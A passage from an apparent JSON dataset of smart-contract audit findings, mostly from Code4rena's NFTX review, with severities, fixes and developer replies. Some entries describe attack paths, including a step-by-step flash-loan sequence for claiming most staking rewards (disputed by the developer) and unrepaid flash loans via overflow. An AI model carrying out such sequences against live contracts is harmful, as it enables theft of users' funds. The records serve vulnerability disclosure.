      "summary": "\nThis bug report is about an issue that arises when executing or cancelling a proposal to sell a stablecoin for CELO. The issue is related to the `unitsToValue` function which is used to convert the underlying stored number of â€œunitsâ€ of stable token to a â€œvalueâ€ of the stable token. In the case of large amounts of stable token, the `unitsToValue` function may overflow due to the multiplication of the already scaled value by an additional `1e24` within the `divide` function. This overflow will cause the calculation to revert, making the funds locked in the GrandaMento contract. \n\nThe issue becomes more likely when dealing with currencies worth substantially less than 1 USD. This issue does not exist for creating a proposal as it utilizes the `valueToUnits` function. \n\nWhen setting maximum exchange amounts, it is important to consider these limits and warn users that if they attempt to exchange too much, their funds may be locked in the GrandaMento contract. It is also important to re-evaluate any limits set for the long term health of GrandaMento if inflation is applied to stablecoins in the future. The bug has since been fixed in pull request #8500.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Celo Contracts Audit â€“ Release 5",
      "source_link": "https://blog.openzeppelin.com/celo-contracts-audit-granda-mento/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "42188",
      "title": "[G-04] Gas optimization for `StakingTokenProvider.nameForStakingToken`",
      "impact": "GAS",
      "content": "\n`StakingTokenProvider.nameForStakingToken`: `if (keccak256(abi.encode(_pairedPrefix)) == keccak256(abi.encode(address(0)))) ` can be simplified to `if(bytes(_pairedPrefix).length== 0)`\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/49)**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/49",
      "tags": [],
      "finders": []
    },
    {
      "id": "42187",
      "title": "[M-08] A malicious receiver can cause another receiver to lose out on distributed fees by returning `false` for `tokensReceived` when `receiveRewards` is called on their receiver contract.",
      "impact": "MEDIUM",
      "content": "\nA malicious receiver can cause another receiver to lose out on distributed fees by returning `false` for `tokensReceived` when `receiveRewards` is called on their receiver contract. This causes the fee distributor to double spend the `amountToSend` because the contract incorrectly assumes the returned data is truthful.\n\n`NFTXFeeDistributor.sol`:\n```solidity\nLine 163: (bool success, bytes memory returnData) = address(_receiver.receiver).call(payload);\n```\nRecommend that you don't trust return data from externally called contracts. Only utilize whether the transaction succeeds to determine if the treasury fallback should be called.\n```\nLine 165: if (!success) {\n```\n\n**[0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/69#issuecomment-845681145):**\n > Nice catch!\n\n",
      "summary": "\nThe bug report discusses a vulnerability in the `NFTXFeeDistributor.sol` contract, where a malicious receiver can cause another receiver to lose out on distributed fees. This is done by returning `false` for `tokensReceived` when `receiveRewards` is called on their receiver contract. This leads to the fee distributor double spending the `amountToSend` because the contract assumes the returned data is truthful. The report recommends not trusting return data from externally called contracts and only using the success of the transaction to determine if the treasury fallback should be called. The bug has been confirmed and a fix is needed to prevent this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/69",
      "tags": [],
      "finders": []
    },
    {
      "id": "42186",
      "title": "[M-07] Tokens can get stuck in `NFTXMintRequestEligibility`",
      "impact": "MEDIUM",
      "content": "\nWhen dealing with ERC721 (instead of 1155) the amounts array is ignored, which leads to an issue.\n\nUser can call `NFTXMintRequestEligibility.requestMint` for an ERC721 with `amounts[i] = 0`.\nThe `ERC721.transferFrom` is still executed but user cannot `reclaimRequestedMint` later and the NFT is stuck as it checks (`amounts[i] > 0`).\n\n\nTokens can get stuck.\nAlso, subscribers to `Request` event could be tricked by specifying `amounts[i] > 1` in the ERC721 case, as only one token was transferred, but the amount multiple quantities get logged.\n\nRecommend that `requestMint`: Check `amounts[i] == 1` in ERC721 case, `amounts[i] > 0` in 1155 case.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/59)**\n\n",
      "summary": "\nThe bug report discusses an issue with ERC721 tokens, specifically with the `amounts` array being ignored. This can cause problems when calling the `NFTXMintRequestEligibility.requestMint` function, as the `ERC721.transferFrom` function is still executed even if `amounts[i]` is set to 0. This means that the user cannot reclaim the requested mint later and the token becomes stuck. Additionally, subscribers to the `Request` event can be tricked by specifying `amounts[i] > 1` in the ERC721 case, even though only one token was transferred. The report recommends checking `amounts[i] == 1` for ERC721 tokens and `amounts[i] > 0` for 1155 tokens in the `requestMint` function to avoid these issues. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/59",
      "tags": [],
      "finders": []
    },
    {
      "id": "42185",
      "title": "[M-05] Unbounded iteration in `NFTXEligiblityManager.distribute` over `_feeReceivers`",
      "impact": "MEDIUM",
      "content": "\n`NFTXEligiblityManager.distribute` iterates over all `_feeReceivers`. If the number of `_feeReceivers` gets too big, the transaction's gas cost could exceed the block gas limit and make it impossible to call `distribute` at all.\n\nRecommend keeping the number of `_feeReceivers` small.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/47)**\n\n",
      "summary": "\nThe NFTXEligiblityManager.distribute function has a bug that can cause issues when there are too many fee receivers. This can lead to a high gas cost that exceeds the block gas limit, making it impossible to call the function. To avoid this issue, it is recommended to keep the number of fee receivers small.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/47",
      "tags": [],
      "finders": []
    },
    {
      "id": "42184",
      "title": "[M-02] Use `safeTransfer`/`safeTransferFrom` consistently instead of `transfer`/`transferFrom`",
      "impact": "MEDIUM",
      "content": "\nIt is good to add a `require()` statement that checks the return value of token transfers, or to use something likeÂ OpenZeppelinâ€™s `safeTransfer`/`safeTransferFrom` unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.\n\nWhile most places use a `require` or `safeTransfer`/`safeTransferFrom`, there are three missing cases in the withdrawal of staking token and rescue of arbitrary tokens sent to the `FeeDistributor` contract.\n\nReference this similar medium-severity finding from [Consensys Diligence Audit of Fei Protocol](https://consensys.net/diligence/audits/2021/01/fei-protocol/#unchecked-return-value-for-iweth-transfer-call).\n\nRecommend usingÂ `safeTransfer`/`safeTransferFrom` or `require()` consistently.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/79)**\n\n",
      "summary": "\nThe bug report highlights the importance of using `require()` or `safeTransfer`/`safeTransferFrom` statements when transferring tokens to avoid silent failures and incorrect token accounting. It also points out three instances in the `FeeDistributor` contract where these statements are missing, which can lead to issues with withdrawing staking tokens and rescuing arbitrary tokens. The report recommends consistently using these statements and references a similar finding from a previous audit of Fei Protocol. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/79",
      "tags": [],
      "finders": []
    },
    {
      "id": "42183",
      "title": "[H-04] `NFTXLPStaking` Is Subject To A Flash Loan Attack That Can Steal Nearly All Rewards/Fees That Have Accrued For A Particular Vault",
      "impact": "HIGH",
      "content": "\nThe LPStaking contract does not require that a stake be locked for any period of time. The LPStaking contract also does not track how long your stake has been locked. So an attacker Alice can stake, claim rewards, and unstake, all in one transaction. If Alice utilizes a flash loan, then she can claim nearly all of the rewards for herself, leaving very little left for the legitimate stakers.\n\nThe fact that the `NFTXVaultUpgradeable` contract contains a native `flashLoan` function makes this attack that much easier, although it would still be possible even without that due to flashloans on Uniswap, or wherever else the nftX token is found.\n\nSince a flash loan will easily dwarf all of the legitimate stakers' size of stake, the contract will erroneously award nearly all of the rewards to Alice.\n\n1.  Wait until an NFTX vault has accrued any significant amount of fees/rewards\n2.  `FlashLoanBorrow` a lot of ETH using any generic flash loan provider\n3.  `FlashLoanBorrow` a lot of nftx-vault-token using `NFTXVaultUpgradeable.flashLoan()`\n4.  Deposit the ETH and nftx-vault-token's into Uniswap for Uniswap LP tokens by calling `Uniswap.addLiquidity()`\n5.  Stake the Uniswap LP tokens in `NFTXLPStaking` by calling `NFTXLPStaking.deposit()`\n6.  Claim nearly all of the rewards that have accrued for this vault due to how large the flashLoaned deposit is relative to all of the legitimate stakes by calling `NFTXLPStaking.claimRewards()`\n7.  Remove LP tokens from `NFTXLPStaking` by calling `NFTXLPStaking.exit()`;\n8.  Withdraw ETH and nftx-vault-token's by calling `Uniswap.removeLiquidity()`;\n9.  Pay back nftx-vault-token flash loan\n10. Pay back ETH flash loan\n\nSee [GitHub issue page](https://github.com/code-423n4/2021-05-nftx-findings/issues/88) for an in-depth  example.\n\nRecommend requiring that staked LP tokens be staked for a particular period of time before they can be removed. Although a very short time frame (a few blocks) would avoid flash loan attacks, this attack could still be performed over the course of a few blocks less efficiently. Ideally, you would want the rewards to reflect the product of the amount staked and the duration that they've been staked, as well as having a minimum time staked.\n\nAlternatively, if you really want to allow people to have the ability to remove their stake immediately, then only allow rewards to be claimed for stakes that have been staked for a certain period of time. Users would still be able to remove their LP tokens, but they could no longer siphon off rewards immediately.\n\n**[0xKiwi (NFTX) disputed](https://github.com/code-423n4/2021-05-nftx-findings/issues/88#issuecomment-845695223):**\n > After looking at the code, this is not possible. The dividend token code takes into consideration the current unclaimed rewards and when a deposit is made that value is deducted.\n\n**[cemozer (Judge) commented](https://github.com/code-423n4/2021-05-nftx-findings/issues/88#issuecomment-848325710):**\n > @0xKiwi do you mind showing where in code that occurs?\n\n",
      "summary": "\nThe LPStaking contract allows users to stake their tokens and claim rewards, but it does not require staked tokens to be locked for a period of time. This means that an attacker can stake, claim rewards, and unstake all in one transaction, leaving little rewards for legitimate stakers. This can be made easier by using a flash loan, which can be obtained through the NFTXVaultUpgradeable contract. This allows the attacker to stake a large amount of tokens and claim most of the rewards, leaving little for others. To fix this, it is recommended to require staked tokens to be locked for a certain period of time before they can be removed, or to only allow rewards to be claimed for tokens that have been staked for a certain period of time.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/88",
      "tags": [],
      "finders": []
    },
    {
      "id": "42182",
      "title": "[H-03] `getRandomTokenIdFromFund` yields wrong probabilities for ERC1155",
      "impact": "HIGH",
      "content": "\n`NFTXVaultUpgradeable.getRandomTokenIdFromFund` does not work with ERC1155 as it does not take the deposited `quantity1155` into account.\n\nAssume `tokenId0` has a count of 100, and `tokenId1` has a count of 1.\nThen `getRandomId` would have a pseudo-random 1:1 chance for token 0 and 1 when in reality it should be 100:1.\n\nThis might make it easier for an attacker to redeem more valuable NFTs as the probabilities are off.\n\nRecommend taking the quantities of each token into account (`quantity1155`) which probably requires a design change as it is currently hard to do without iterating over all tokens.\n\n**[0xKiwi (NFTX) acknowledged](https://github.com/code-423n4/2021-05-nftx-findings/issues/56)**\n\n**[cemozer (Judge) commented](https://github.com/code-423n4/2021-05-nftx-findings/issues/56#issuecomment-848266608):**\n > Marking this as high risk as an attacker can weed out high-value NFTs from a vault putting other users funds at risk\n\n",
      "summary": "\nThe `NFTXVaultUpgradeable.getRandomTokenIdFromFund` function is not working correctly with ERC1155 tokens. This means that when trying to randomly select a token, it does not take into account the quantity of tokens that have been deposited. This can lead to an unfair distribution of tokens, making it easier for an attacker to redeem more valuable NFTs. This bug has been acknowledged by the developer and a design change may be needed to fix it. A judge has marked this as a high-risk issue as it could put users' funds at risk.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/56",
      "tags": [],
      "finders": []
    },
    {
      "id": "42181",
      "title": "[H-02] `distribute` DoS on missing `receiveRewards` implementation",
      "impact": "HIGH",
      "content": "\n`NFTXEligiblityManager._sendForReceiver` should check `returnData.length == 1` before decoding. Otherwise, if it returns no return data, the `abi.decode` call will revert and with it the whole `distribute` function .\n\nA single poorly implemented `feeReceiver` can break the whole `distribute` function and allow a denial of service by reverting the transaction.\n\nRecommend changing to: `bool tokensReceived = returnData.length == 1 && abi.decode(returnData, (bool));`.\n\n**[0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/46):**\n\n**[cemozer (Judge) commented](https://github.com/code-423n4/2021-05-nftx-findings/issues/46#issuecomment-848259748):**\n > Marking this as high risk because one nefarious feeReceiver can in fact deny other users to receive their fees\n\n",
      "summary": "\nThe report discusses a bug in the NFTXEligibilityManager contract that could potentially cause a denial of service by reverting the transaction. This is due to a poorly implemented `feeReceiver` function that can break the `distribute` function. The suggested solution is to change the code to check for the length of the return data before decoding it, and only proceed if the length is equal to 1. The severity of this bug has been marked as high risk because it could potentially prevent users from receiving their fees.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/46",
      "tags": [],
      "finders": []
    },
    {
      "id": "42180",
      "title": "[H-01] Missing overflow check in `flashLoan`",
      "impact": "HIGH",
      "content": "\n`ERC20FlashMintUpgradeable.flashLoan` does not check for an overflow when adding the fees to the `flashloan` amount.\nThe functionality might have been copied from https://eips.ethereum.org/EIPS/eip-3156 but this one already has overflow checks as it uses solidity 0.8.0. This leads to an issue where the attacker does not need to pay back the `flashloan` as they will burn 0 tokens:\n\n```solidity\n_burn(address(receiver), amount + fee);\n```\nThey end up with a huge profit. (Luckily, this is currently not exploitable as the fee is set to 0 so there's no possibility to overflow. However, if governance decides to change the flashloan fee, flashloans can be taken without having to repay them). Recommend using `SafeMath`.\n\n**[0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/43#issuecomment-845566980):**\n > Upgraded to 0.8.x.\n\n",
      "summary": "\nThe function `ERC20FlashMintUpgradeable.flashLoan` has a bug where it does not properly check for an overflow when adding fees to the flashloan amount. This can potentially lead to an issue where attackers can take flashloans without having to pay them back, resulting in a large profit. The bug may have been copied from a similar function, but that one already has overflow checks. The current fee is set to 0, so the bug is not exploitable at the moment, but if the fee is changed, it could become a problem. It is recommended to use `SafeMath` to prevent this bug from occurring. The bug has been confirmed by a developer and the code has been upgraded to fix it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/43",
      "tags": [],
      "finders": []
    },
    {
      "id": "4034",
      "title": "[G-06] Unused variables",
      "impact": "GAS",
      "content": "\nThere are unused variables in contract `NFTXVaultUpgradeable` (string public description) and in contract `NFTXMintRequestEligibility` (address public manager). Recommend deleting unused variables to reduce the deployment costs.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/39",
      "tags": [],
      "finders": []
    },
    {
      "id": "4033",
      "title": "[G-05] Revert inside a loop",
      "impact": "GAS",
      "content": "\nHere you have more info: https://gist.github.com/alexon1234/a2275d1724ce2122d36bc555e46a25c1\n\n**- [0xKiwi (NFTX) acknowledged](https://github.com/code-423n4/2021-05-nftx-findings/issues/97)**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/97",
      "tags": [],
      "finders": []
    },
    {
      "id": "4032",
      "title": "[G-04] Gas optimization for StakingTokenProvider.nameForStakingToken",
      "impact": "GAS",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\n`StakingTokenProvider.nameForStakingToken`: `if (keccak256(abi.encode(_pairedPrefix)) == keccak256(abi.encode(address(0)))) ` can be simplified to `if(bytes(_pairedPrefix).length== 0)`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/49",
      "tags": [],
      "finders": []
    },
    {
      "id": "4031",
      "title": "[G-03] Change function visibility from public to external",
      "impact": "GAS",
      "content": "\nVarious functions across contracts are never called from within contracts yet are declared public. Their visibility can be made external to save gas.\n\nAs described in https://mudit.blog/solidity-gas-optimization-tips/:\n> â€œFor all the public functions, the input parameters are copied to memory automatically, and it costs gas. If your function is only called externally, then you should explicitly mark it as external. External functionâ€™s parameters are not copied into memory but are read from `calldata` directly. This small optimization in your solidity code can save you a lot of gas when the function input parameters are huge.â€\n\nRecommend changing function visibility from public to external.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/64)**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/64",
      "tags": [],
      "finders": []
    },
    {
      "id": "4030",
      "title": "[G-02] Unused events",
      "impact": "GAS",
      "content": "\nUnused events increase contract size at deployment. Multiple events in `NFTXMintRequestEligibility.sol` listed on the issue page. Recommend removing unused events or emit at appropriate places.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/63)**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/63",
      "tags": [],
      "finders": []
    },
    {
      "id": "4029",
      "title": "[G-01] Unused storage variables",
      "impact": "GAS",
      "content": "\nUnused storage variables in contracts use up storage slots and increase contract size and gas usage at deployment and initialization. Multiple variables across different contracts including `manager` , `allVaults`, `vaultsForAsset`, and `prevContract`. Recommend removing unused variables.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/62)**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/62",
      "tags": [],
      "finders": []
    },
    {
      "id": "4028",
      "title": "[L-10] __Ownable_init will be called twice in multiple Eligibility contracts",
      "impact": "LOW",
      "content": "## Handle\n\na_delamo\n\n\n## Vulnerability details\n\nHere you have more info: https://gist.github.com/alexon1234/43bf4a72a5b06651f04fc8052349ac5a",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/84",
      "tags": [],
      "finders": []
    },
    {
      "id": "4027",
      "title": "[L-09] lack of zero address validation",
      "impact": "LOW",
      "content": "## Handle\n\nJMukesh\n\n\n## Vulnerability details\n\n## Impact\ninit function  like __FeeDistributor__init__() are used to initialize the state variable,  since these state variable are used in many function ,  due to lack of input validation, error in  these state variable can lead to redeployment of contract \n\n## Proof of Concept\nIn NFTXFeeDistributor.sol --> __FeeDistributor__init__()\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXFeeDistributor.sol#L35\n\nin NFTXLPStaking.sol --> __NFTXLPStaking__init()\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L35\n\nin NFTXVaultUpgradeable.sol -- > __NFTXVault_init()\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L100\n\nin StakingTokenProvider.sol --> __StakingTokenProvider_init()\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/main/nftx-protocol-v2/contracts/solidity/StakingTokenProvider.sol#L23\n\n## Tools Used\nslither\n\n## Recommended Mitigation Steps\n\nadd zero address validation",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/82",
      "tags": [],
      "finders": []
    },
    {
      "id": "4026",
      "title": "[L-08] eligibilityManager is always 0x0",
      "impact": "LOW",
      "content": "## Handle\n\npaulius.eth\n\n\n## Vulnerability details\n\n## Impact\ncontract NFTXVaultFactoryUpgradeable, variable eligibilityManager is never set thus it gets a default value of 0x0. So function deployEligibilityStorage should always fail as the eligibility manager does not exist on address 0x0.\n\n## Recommended Mitigation Steps\nEither add a setter for eligibilityManager or refactor function deployEligibilityStorage to work in such case.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/25",
      "tags": [],
      "finders": []
    },
    {
      "id": "4025",
      "title": "[L-07] Vaultâ€™s flash loan not implemented according to EIP-3156",
      "impact": "LOW",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nThe `NFTXVaultUpgradeable.flashLoan` is not correctly implemented according to  EIP-3156 (but it tries to implement it as it inherits from `IERC3156FlashLenderUpgradeable`).\n\n> \"If successful, flashLoan MUST return true.\" - https://eips.ethereum.org/EIPS/eip-3156\n\nIt misses the return and currently always returns `false`.\n\n## Impact\n\nAlways returning `false` indicates that the flash loan was unsuccessful when in reality it could have been successful.\nThis breaks any contract trying to integrate with it.\n\n\n## Recommended Mitigation Steps\n\nAdd the return statement: `return super.flashLoan(...)`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/54",
      "tags": [],
      "finders": []
    },
    {
      "id": "4024",
      "title": "[L-06] Unchecked external calls in NFTXLPStaking",
      "impact": "LOW",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nThe `emergencyExit`/`emergencyExitAndClaim` functions take the staking and reward tokens as parameters and trust them for the withdrawal.\n\n## Impact\n\nThis does not lead to a critical issue (like being able to withdraw all funds) as one cannot deploy a fake reward smart contract to a `_rewardDistributionTokenAddr` and a random address without a smart contract will fail because of the `dist.balanceOf(msg.sender)` call not returning any data.\nHowever, checking if the distribution token exists is still recommended.\n\n\n## Recommended Mitigation Steps\n\nRequire `isContract(dist)`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/48",
      "tags": [],
      "finders": []
    },
    {
      "id": "4023",
      "title": "[L-05] Inconsistent solidity pragma",
      "impact": "LOW",
      "content": "## Handle\n\nmaplesyrup\n\n\n## Vulnerability details\n\n## Impact\n\nThe source files have different solidity compiler ranges referenced.  This leads to potential security flaws between deployed contracts depending on the compiler version chosen for any particular file.  It also greatly increases the cost of maintenance as different compiler versions have different semantics and behavior.\n\n## Proof of Concept\n\nThis defect has numerous surfaces at https://github.com/code-423n4/2021-05-nftx/tree/main/nftx-protocol-v2/contracts/solidity\n\nDifferent versions of Solidity are used in :\n\t- Version used: ['0.6.8', '>=0.4.22<0.9.0', '>=0.4.24<0.7.0', '>=0.6.0<0.8.0', '>=0.6.2<0.8.0', '^0.6.0', '^0.6.8']\n\t- 0.6.8 (contracts/solidity/NFTXEligiblityManager.sol#2)\n\t- ABIEncoderV2 (contracts/solidity/NFTXEligiblityManager.sol#3)\n\t- ^0.6.8 (contracts/solidity/NFTXFeeDistributor.sol#3)\n\t- 0.6.8 (contracts/solidity/NFTXLPStaking.sol#3)\n\t- 0.6.8 (contracts/solidity/NFTXVaultFactoryUpgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/NFTXVaultUpgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/StakingTokenProvider.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXDeferEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXDenyEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXListEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXMintRequestEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXRangeEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXUniqueEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/UniqueEligibility.sol#2)\n\t- >=0.6.0<0.8.0 (contracts/solidity/interface/IERC165Upgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/IERC3156Upgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/INFTXEligibility.sol#2)\n\t- 0.6.8 (contracts/solidity/interface/INFTXEligibilityManager.sol#1)\n\t- ^0.6.8 (contracts/solidity/interface/INFTXFeeDistributor.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/INFTXLPStaking.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/INFTXVault.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/INFTXVaultFactory.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/IPrevNftxContract.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/IRewardDistributionToken.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/IVaultTokenUpgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/proxy/BeaconProxy.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/proxy/ClonesUpgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/proxy/IBeacon.sol#3)\n\t- >=0.4.24<0.7.0 (contracts/solidity/proxy/Initializable.sol#3)\n\t- 0.6.8 (contracts/solidity/proxy/Proxy.sol#3)\n\t- 0.6.8 (contracts/solidity/proxy/UpgradeableBeacon.sol#3)\n\t- 0.6.8 (contracts/solidity/testing/MockStakingProvider.sol#3)\n\t- 0.6.8 (contracts/solidity/testing/MockVault.sol#2)\n\t- ^0.6.0 (contracts/solidity/token/ERC1155HolderUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/token/ERC20BurnableUpgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/token/ERC20FlashMintUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/token/ERC20Upgradeable.sol#3)\n\t- ^0.6.0 (contracts/solidity/token/ERC721HolderUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/token/IERC1155ReceiverUpgradeable.sol#3)\n\t- >=0.6.2<0.8.0 (contracts/solidity/token/IERC1155Upgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/token/IERC20Upgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/token/IERC721ReceiverUpgradeable.sol#3)\n\t- >=0.6.2<0.8.0 (contracts/solidity/token/IERC721Upgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/token/RewardDistributionTokenUpgradeable.sol#2)\n\t- 0.6.8 (contracts/solidity/util/Address.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/util/ContextUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/util/EnumerableSetUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/util/OwnableUpgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/util/PausableUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/util/ReentrancyGuardUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/util/SafeERC20Upgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/util/SafeMathInt.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/util/SafeMathUpgradeable.sol#3)\n\t- >=0.4.22<0.9.0 